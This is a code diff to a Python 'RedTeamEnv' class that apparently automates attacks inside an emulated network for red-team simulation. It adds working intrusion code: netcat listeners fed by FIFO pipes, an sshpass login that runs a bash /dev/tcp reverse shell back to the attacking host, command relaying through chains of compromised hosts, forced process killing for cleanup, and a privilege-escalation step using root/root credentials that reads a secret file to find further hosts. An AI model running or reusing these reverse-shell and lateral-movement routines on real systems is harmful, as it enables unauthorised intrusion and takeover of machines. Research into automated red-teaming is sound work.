@@ -1,13 +1,14 @@
 
+import base64
 import ipaddress
 import networkx as nx
-# from aco_emulator import ACOEmulator
+from aco_emulator import ACOEmulator
 import re
 import matplotlib.pyplot as plt
-
+import shlex
 
 class RedTeamEnv:
-    def __init__(self, topo):
+    def __init__(self, topo: ACOEmulator):
         self.topo = topo
         self.topo.build(interactive=False)
         self.net = topo.net
@@ -21,7 +22,9 @@ class RedTeamEnv:
             }
         }
         self.reverse_shells = {}  # (src, dst) -> port
-
+        self.host_available_ports = {
+            "user0": 4444,
+        }  # host -> available ports
         
         # Track nodes with root access
         self.root_access_nodes = {'user0'}
@@ -59,11 +62,10 @@ class RedTeamEnv:
             print(f"[!] No root-access node found in subnet {subnet}")
             return
 
-        docker = self.net.get(selected_node)
         print(f"[*] {selected_node} executing discovery on subnet {subnet}")
 
         subnet_prefix = str(subnet.network_address).rsplit('.', 1)[0]
-        output = docker.cmd(f"./{script_path} {subnet_prefix}")
+        output = self.execute_command_on(selected_node, f"./{script_path} {subnet_prefix}").strip()
 
         for line in output.splitlines():
             if "Host up:" in line:
@@ -97,10 +99,11 @@ class RedTeamEnv:
             print(f"[!] No root-access node can reach {target_ip}")
             return
 
-        docker = self.net.get(source_node)
         print(f"[*] {source_node} executing service discovery on {target_ip}")
-        output = docker.cmd(f"./{script_path} {target_ip}")
+        output = self.execute_command_on(source_node, f"bash {script_path} {target_ip}").strip()
         
+        print(f"[>] Nmap output:\n{output}")
+        print("-" * 80)
         # Parse Nmap output for open ports
         services = []
         for line in output.splitlines():
@@ -109,11 +112,15 @@ class RedTeamEnv:
                 port = int(match.group(1))
                 protocol = match.group(2)
                 service = match.group(3) if match.lastindex >= 3 else None
-                services.append({
-                    "port": port,
-                    "protocol": protocol,
-                    "service": service
-                })
+                
+                # add if not already in list
+                if len(services) == 0 or not any(s['port'] == port for s in services):
+                # Add service to the list
+                    services.append({
+                        "port": port,
+                        "protocol": protocol,
+                        "service": service
+                    })
 
         if services:
             # Add/update graph node for target IP
@@ -141,12 +148,13 @@ class RedTeamEnv:
         node_colors = []
         for _, attr in self.graph.nodes(data=True):
             if attr.get('access') == 'root':
-                node_colors.append('lightgreen')
+                node_colors.append('red')
+            elif attr.get('access') == 'user':
+                node_colors.append('yellow')
             else:
                 node_colors.append('lightgray')
 
         # Node labels: include IP, access level and service info
-        
         def get_service_info_str(open_ports):
             if open_ports:
                 return "\n".join([f"{service['port']}/{service['protocol']} ({service['service']})" for service in open_ports])
@@ -154,7 +162,7 @@ class RedTeamEnv:
                 return ""
         
         labels = {
-            node: f"{node}\n{data['ip']}\n({data['access']}){get_service_info_str(data.get('Open Ports', []))}"
+            node: f"{node}\n{data['ip']}\n({data['access']})\n{get_service_info_str(data.get('Open Ports', []))}"
             for node, data in self.graph.nodes(data=True)
         }
 
@@ -178,7 +186,7 @@ class RedTeamEnv:
         """
         target_host = self._resolve_ip_to_host(ipaddress.IPv4Address(target_ip))
         
-        if nx.has_path(self.graph, node, target_host):
+        if self.graph.has_edge(node, target_host):
             return True
         return False
 
@@ -187,12 +195,11 @@ class RedTeamEnv:
         relay_cmd = self._relay_command("user0", target_node, command)
         if relay_cmd:
             print(f"[>] Sending relayed command to {target_node}:\n{relay_cmd}")
-            result = self.net.get("user0").cmd(relay_cmd)
-            print(f"[<] Response:\n{result}")
+            result = self.net.get("user0").cmd(relay_cmd).strip()
+            print(f"[<] Command result: {result}")
             return result
         else:
             print("[!] Command not sent — path unreachable.")
-
 
     def _relay_command(self, source, target, final_command):
         """Construct a command relayed through the reverse shell chain."""
@@ -208,57 +215,171 @@ class RedTeamEnv:
         
         if len(path) == 1:
             return cmd
-        
+                
         for i in range(len(path) - 1, 0, -1):
             attacker = path[i-1]
             victim = path[i]
             edge_data = self.graph[attacker][victim]
             port = edge_data.get("port")
-            victim_ip = self.host_ip_map[victim]
-
-            # Wrap the command to send via netcat
-            cmd = f"echo \"{cmd}\" | nc {victim_ip} {port}"
-
+            
+            if not port:
+                raise ValueError(f"[!] No port found for edge {attacker} → {victim}")
+            
+            # encoded = base64.b64encode(cmd.encode()).decode()
+            
+            sleep_time = 22 if 'network' in cmd else 3
+            cmd = shlex.quote(cmd)
+            empty_cmd = shlex.quote("")
+            
+            cmd = f"echo {empty_cmd} > /home/hacker/output_{port}.txt ; echo {cmd} > /home/hacker/fifo_{port}; sleep {sleep_time}; cat /home/hacker/output_{port}.txt | strings "
+            # cmd = f"echo \"\" > /home/hacker/output_{port}.txt ; echo \"{encoded}\" | base64 -d > /home/hacker/fifo_{port}; sleep {sleep_time}; cat /home/hacker/output_{port}.txt | strings "
         return cmd
-
-    def start_listener(self, listener_host: str, listen_port: int):
-        """Start a netcat listener on the given host and port."""
-        cmd = f"nohup nc -lnvp {listen_port} > /dev/null 2>&1 &"
-        print(f"[*] Starting listener on {listener_host}:{listen_port}")
-        self.execute_command_on(listener_host, command=cmd)
-
         
-    def drop_reverse_shell(self, from_host: str, to_host: str, revshell_port: int, username: str, password: str):
+    def drop_reverse_shell(self, from_host: str, to_host: str, username: str, password: str):
         """
-        Establish a reverse shell from from_host to to_host.
-        1. Starts a listener on to_host:revshell_port.
-        2. From user0, tells from_host to SSH into itself and reverse shell to to_host.
+        Establish a reliable reverse shell from `from_host` to `to_host` using FIFO pipes and relayed commands.
+        Sets up a persistent command relay using tail + while loop and netcat.
         """
-        attacker_ip = self.host_ip_map[to_host]
-        target_ip = self.host_ip_map[from_host]
+        attacker_ip = self.host_ip_map[from_host]
+        target_ip = self.host_ip_map[to_host]
+        revshell_port = self.host_available_ports.get(from_host)
 
-        # Step 1: Start listener on to_host via user0
-        result = self.start_listener(listener_host=from_host, listen_port=revshell_port)
-        print('Result: ', result)
+        in_file = f"/home/hacker/input_{revshell_port}.txt"
+        out_file = f"/home/hacker/output_{revshell_port}.txt"
+        fifo_file = f"/home/hacker/fifo_{revshell_port}"
 
-        # Step 2: Send reverse shell from from_host to to_host via user0
+        # Step 1: Setup persistent command relay on `to_host`
+        setup_cmds = [
+            f"rm -f {in_file} {out_file} {fifo_file}",
+            f"mkfifo {fifo_file}",
+            f"touch {in_file} {out_file}",
+
+            # This process sets up reverse shell listener piping output into fifo
+            f"bash -c \"tail -f {fifo_file} | nc -lnvp {revshell_port} | tee {out_file} &\"",
+        ]
+
+        full_setup_cmd = " && ".join(setup_cmds)
+        print(f"[*] Setting up persistent FIFO reverse shell listener on {to_host}")
+        result = self.execute_command_on(from_host, full_setup_cmd).strip()
+        print(f"[<] Setup command result: {result}")
+
+        # Step 2: Connect from `to_host` back to listener on `from_host`
         revshell_cmd = (
             f"sshpass -p '{password}' ssh -o StrictHostKeyChecking=no "
             f"-o ConnectTimeout=5 {username}@{target_ip} "
             f"\"bash -i >& /dev/tcp/{attacker_ip}/{revshell_port} 0>&1\" &"
         )
+        print(f"[*] Dropping reverse shell from {to_host} to {from_host}:{revshell_port}")
+        result = self.execute_command_on(from_host, command=revshell_cmd).strip()
 
-        print(f"[*] Dropping reverse shell from {from_host} to {to_host}:{revshell_port}")
-        self.execute_command_on(from_host, command=revshell_cmd)
+        # Step 3: Register reverse shell path
+        shell_type = "root" if username == "root" else "user"
+        self.register_reverse_shell(from_host, to_host, revshell_port, shell_type)
 
-        # Update graph with new reachability edge
-        self.register_reverse_shell(from_host, to_host, revshell_port)
-    
-    def register_reverse_shell(self, attacker, target, port):
+    def register_reverse_shell(self, attacker: str, target: str, port: int, access_level: str):
         """Add reverse shell edge and metadata to graph."""
         self.reverse_shells[(attacker, target)] = port
         if self.graph.has_edge(attacker, target):
             self.graph[attacker][target].update(port=port, type="reverse_shell")
         else:
             self.graph.add_edge(attacker, target, port=port, type="reverse_shell")
+            
+        self.observations[target]['Access'] = access_level
+        self.graph.nodes[target]['access'] = access_level
+        
+        if access_level == 'root':
+            self.root_access_nodes.add(target)
+        
+        self.host_available_ports[attacker] = port + 1
+        old_port = self.host_available_ports.get(target)
+        if old_port == None:
+            self.host_available_ports[target] = 4444
+        
         print(f"[+] Reverse shell established: {attacker} → {target} via port {port}")
+        
+    def delete_reverse_shell(self, from_host: str, to_host: str):
+        """
+        Cleans up a previously established reverse shell between from_host and to_host.
+        1. Kills background processes (nc, tail, cat) on to_host via from_host.
+        2. Removes FIFO, input, and output buffer files on to_host.
+        3. Unregisters the reverse shell from internal tracking.
+        """
+        revshell_port = self.reverse_shells.get((from_host, to_host), {})
+        if not revshell_port:
+            print(f"[!] No reverse shell found between {from_host} and {to_host}.")
+            return
+
+        in_file = f"/home/hacker/input_{revshell_port}.txt"
+        out_file = f"/home/hacker/output_{revshell_port}.txt"
+        fifo_file = f"/home/hacker/fifo_{revshell_port}"
+
+
+        cleanup_cmd = f"""
+        pids=$(ps aux | grep -E '{in_file}|{fifo_file}|nc|tail' | grep -v grep | awk '{{print $2}}') ;
+        for pid in $pids; do kill -9 $pid ; done ;
+        rm -f {in_file} {out_file} {fifo_file} ;
+        """
+
+        full_cleanup_cmd = cleanup_cmd
+
+        print(f"[*] Cleaning up reverse shell from {from_host} to {to_host}")
+        result = self.execute_command_on(from_host, full_cleanup_cmd).strip()
+
+        # Unregister from tracking
+        self.unregister_reverse_shell(from_host, to_host)
+    
+    def unregister_reverse_shell(self, from_host: str, to_host: str):
+        """Remove reverse shell edge and metadata from graph."""
+        if (from_host, to_host) in self.reverse_shells:
+            del self.reverse_shells[(from_host, to_host)]
+            self.graph[from_host][to_host].update(port=None, type=None)
+            print(f"[+] Reverse shell removed: {from_host} → {to_host}")
+        else:
+            print(f"[!] No reverse shell found between {from_host} and {to_host}.")
+        
+        # Update available ports
+        # if from_host in self.host_available_ports:
+        #     self.host_available_ports[from_host] -= 1
+            
+        self.observations[to_host]['Access'] = 'unknown'
+        self.graph.nodes[to_host]['access'] = 'unknown'
+        
+        if to_host in self.root_access_nodes:
+            self.root_access_nodes.remove(to_host)
+        
+    def privilege_escalate(self, target):
+        source_node = None
+        for node in self.root_access_nodes:
+            if self._is_reachable(node, self.host_ip_map[target]):
+                source_node = node
+                break
+            
+        if not source_node:
+            raise ValueError(f"[!] No root-access node can reach {target}")
+        
+        print(f"[*] {source_node} executing privilege escalation on {target}")
+        
+        self.drop_reverse_shell(source_node, target, 'root', 'root')
+        
+        discover_cmd = f"cat /home/hacker/secret.txt"
+        result = self.execute_command_on(target, discover_cmd).strip()  
+        
+        for line in result.splitlines():
+            match = re.match(r'^\s*([^=\s]+)\s*=\s*([^=\s]+)\s*$', line)
+            if match:
+                key = match.group(1)
+                value = match.group(2)
+                
+                # Update the graph with the new host
+                if key not in self.graph.nodes:
+                    self.graph.add_node(key, ip=value, access='unknown')
+                    self.graph.add_edge(target, key)
+                    
+                    self.observations[key] = {
+                        'IP Address': value,
+                        'Subnet': ipaddress.IPv4Network(value + '/24', strict=False),
+                        'Open Ports': [],
+                        'Access': 'unknown',
+                    }
+                    
+                    print(f"[+] Discovered: {key} ({value})")
